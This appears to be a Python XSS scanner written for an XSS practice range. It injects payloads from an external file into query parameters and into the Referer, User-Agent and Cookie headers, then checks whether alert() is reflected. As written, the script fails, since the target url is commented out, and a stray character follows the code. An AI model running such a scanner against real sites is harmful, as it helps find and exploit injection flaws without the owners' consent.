import requests, re, urllib.parse
from lxml import etree


# HTMl实体字符转换：
def html_string(string):
    result = ""
    for c in string:
        result += "&#x" + hex(ord(c)) + ";"
    return result.replace('0x', '')


# 思路是总结大部分xss_payload的标签，然后通过xpath对这些标签，属性进行检测，如果含有这些标签，则将将其放入一个元组，在与payload进行比对，得出payload

def xss_scan(url):
    xss_url = url.split('?')[0]
    prarms_list = url.split('?')[1].split('&')
    with open('./fuzz/xss_payload.txt') as file:
        payload_list = file.readlines()
    for payload in payload_list:
        xss_type = payload.strip().split(':', 1)[0]
        xss_payload = payload.strip().split(':', 1)[1]
        prarms = {}
        for prarm in prarms_list:
            key = prarm.split('=')[0]
            prarms[key] = xss_payload + " "
        # print(prarms)
        xss_re = re.findall('(alert\(\d*\))', xss_payload)[0]
        if xss_type == "Referer" or xss_type == "User-Agent" or xss_type == "Cookie":
            heard = {xss_type: xss_payload}
            resp = requests.get(url=xss_url, headers=heard)
        elif xss_type == "Escape":
            # 将payload格式化，并且进行url编码
            xss_payload = urllib.parse.quote(html_string(xss_payload)) + "&submit=添加友情链接"
            resp = requests.get(url=xss_url, params=xss_payload)
        else:
            resp = requests.get(url=xss_url, params=prarms)
        # print(resp.text)
        resp = resp.content.decode('utf-8')  # -- 对原数据转码
        html = etree.HTML(resp)  # 把str转为element对象
        # print(xss_re)
        # 匹配标签为<script>alert(*)</script>的漏洞
        if xss_re in html.xpath('//script/text()'):
            print(xss_payload)
        # 匹配标签属性为onclick=alert(*)
        elif xss_re in html.xpath('//@onclick'):
            print(xss_payload)
        elif xss_re in html.xpath('//@onmouseover'):
            print(xss_payload)
        elif xss_re in html.xpath('//@*'):
            print(html.xpath('//@javascript'))
        # print(html.xpath('//@*'))



if __name__ == '__main__':
    #针对xss靶场环境的测试
    # url="http://test.ctf8.com/level11.php?keyword=good%20job!"
    #url = "http://test.ctf8.com/level8.php?keyword=1&submit=添加友情链接"
    # url = "http://test.ctf8.com/level2.php?keyword=list"
    # url = "http://test.ctf8.com/level18.php?arg01=a&arg02=b"
    # url = "http://test.ctf8.com/level1.php?name=list"
    xss_scan(url)
、
